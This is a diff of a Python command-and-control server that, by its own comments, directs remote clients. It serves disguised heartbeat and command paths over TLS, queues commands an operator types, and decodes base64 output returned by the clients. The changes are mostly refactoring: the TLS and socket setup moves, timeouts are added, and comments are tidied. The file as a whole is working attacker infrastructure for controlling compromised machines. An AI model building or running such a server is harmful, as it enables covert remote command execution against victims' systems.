@@ -25,14 +25,24 @@ KEY = args['key'] # "server.key"
 
 # Paths used by the client for C&C
 # ToDo: change these automatically?
+# Might use the same path for both actually
 path_heartbeat = "/YXNmYXNkZnNk"
 path_command_response = "/dmJ2YnZiZGZh"
+
+connection_timeout = 20 # seconds
+io_response_timeout = 10 # seconds
+
+# Create SSL/TLS context which we use to wrap all incoming connections
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+context.load_cert_chain(certfile=CERT, keyfile=KEY)
+context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or newer
+context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')
 
 # Queues for thread interaction
 command_queue = Queue() # command queue
 output_queue = Queue() # output queue
 interrupted = False
-active_clients = set()
+#active_clients = set()
 
 # dequeue element
 # Returns element or <None>, if there is no element (no blocking)
@@ -51,16 +61,14 @@ def build_response(headers, payload, response_type="200 OK"):
     res = "HTTP/1.1 {}\r\n".format(response_type)
     if len(payload):
         headers["Content-Length"] = len(payload)
-
     for key in headers:
         res += str(key) + ": " + str(headers[key]) + "\r\n"
-    
     res += "\r\n"
     res += payload
     return res.encode("utf-8")
 
 # HTTP request
-# Don't bother with meticulous exception handling, if the input is malformed, just error out
+# Don't bother with meticulous exception handling, if the input is malformed, then just hit them with the old 400
 class Request:
     def __init__(self, received):
         # split head section and body section
@@ -73,10 +81,7 @@ class Request:
         request_line = request_and_headers[0]
         header_lines = request_and_headers[1] if len(request_and_headers) > 1 else b"" # can be empty
 
-        # parse request line
         self.METHOD, self.PATH, self.PROTOCOL = self.parse_request_line(request_line)
-
-        # parse headers
         self.HEADERS = self.parse_headers(header_lines)
 
     def parse_request_line(self, line_bytes):
@@ -85,32 +90,29 @@ class Request:
     def parse_headers(self, header_bytes):
         headers = {}
         header_str = header_bytes.decode("utf-8")
+        
         for line in header_str.splitlines():
             key_and_value = line.split(":", 1)
             
             if len(key_and_value) < 2:
                 continue # ignore invalid headers
-
+            
             key, value = key_and_value
             headers[key.lower()] = value.strip()
+        
         return headers
 
 # Interact with client
 def handle_client(conn, source):
     try:
         received = conn.recv() # receive first chunk of data
-
-        # if there is a parsing problem at this stage, then just hit them with the old 400
         req = Request(received)
         
+        # Acquire potentially missing HTTP content from socket
         # Look for Content-Length header
         content_length_value = req.HEADERS.get("content-length")
-        
-        # Acquire potentially missing HTTP content from socket
         if content_length_value:
             content_length = int(content_length_value)
-            #print("Content-Length parsed: {}".format(content_length))
-
             while len(req.BODY) < content_length:
                 chunk = conn.recv()
                 if not chunk:
@@ -130,7 +132,6 @@ def handle_client(conn, source):
             # Pack as json. <None> gets turned into <null> automatically
             response_payload = { "com" : command } 
             response_body = json.dumps(response_payload)
- 
             conn.write(build_response(headers=response_headers, payload=response_body))
             conn.close()
             return
@@ -156,31 +157,18 @@ def handle_client(conn, source):
     except Exception as e:
         print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
         print(e)
-        
         if conn:
             conn.write(build_response(headers={"Connection": "Closed"}, payload="", response_type="400 Bad Request"))
             conn.close()
 
-# Create SSL/TLS context which we use to wrap all incoming connections
-context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-context.load_cert_chain(certfile=CERT, keyfile=KEY)
-context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or newer
-context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')
-
-# Create general purpose socket for accepting incomming connections
-sock = socket.socket()
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.bind((HOST, PORT))
-sock.listen(5)
-print("[*] Listening on port {}...".format(PORT))
-
 # Network Loop
-def listening_loop():
+def listening_loop(sock):
     while not interrupted:
         conn = None
         try:
             incoming_socket, incoming_addr = sock.accept()
             conn = context.wrap_socket(incoming_socket, server_side=True)
+            conn.settimeout(connection_timeout)
             handle_client(conn, incoming_addr)
         except ssl.SSLError as e:
             print(e)
@@ -190,27 +178,21 @@ def listening_loop():
             if conn:
                 conn.close()
 
-# Start network loop as daemon thread
-server_thread = threading.Thread(target=listening_loop)
-server_thread.setDaemon(True)
-server_thread.start()
-
 # Horrible way of doing this, but I don't want to use a library, requirements are for chumps
 # ToDo: figure out proper way
 def figure_out_charset(input_bytes):
     encodings = ["utf-8", "ascii", "latin_1", "cp1251", "cp1252", "cp1250", "cp424", "cp437", "big5", "big5hkscs", "shift_jis"]
-    for encoding in encodings:
+    for enc in encodings:
         try:
-            output = input_bytes.decode(encoding)
-            #print("Detected: " + encoding)
+            output = input_bytes.decode(enc)
+            #print("Detected: " + enc)
             return output
         except:
             pass
-    return input_bytes # just return bytes string if nothing fit the input
+    return input_bytes # just return bytes string if nothing fits the input
 
 # Decide what and how to display command response/error
 def display_response(response):
-    #print(response)
     res_json = json.loads(response)
     if(res_json.get("output")):
         dec = base64.b64decode(res_json.get("output"))
@@ -220,17 +202,28 @@ def display_response(response):
         dec = base64.b64decode(res_json.get("error"))
         print("Error:", figure_out_charset(dec))
 
+# Create general purpose socket for accepting incomming connections
+server_sock = socket.socket()
+server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server_sock.bind((HOST, PORT))
+server_sock.listen(5)
+
+# Start network loop as daemon thread
+server_thread = threading.Thread(target=listening_loop, args=(server_sock,))
+server_thread.setDaemon(True)
+server_thread.start()
+print("[*] Listening on port {}...".format(PORT))
+
 # I/O Loop
-response_timeout = 10 # seconds
 try: 
     while not interrupted:
         user_input = input("> ")
 
         # Print any possible leftovers
         # ToDo: think of a better way to do this
-        while not output_queue.empty():
-            print("[*] Old messages:")
-            display_response(deq(output_queue))
+        while old_msg := deq(output_queue):
+            print("[*] Old message:")
+            display_response(old_msg)
 
         # skip empty commands (pressing enter)
         if not user_input:
@@ -239,8 +232,8 @@ try:
         # Hand over command to the network loop
         command_queue.put(user_input)
 
-        # wait a bit for a response
-        response = deq(output_queue, response_timeout)
+        # wait a bit for a response before prompting again
+        response = deq(output_queue, io_response_timeout)
         if response:
             display_response(response)
         else:
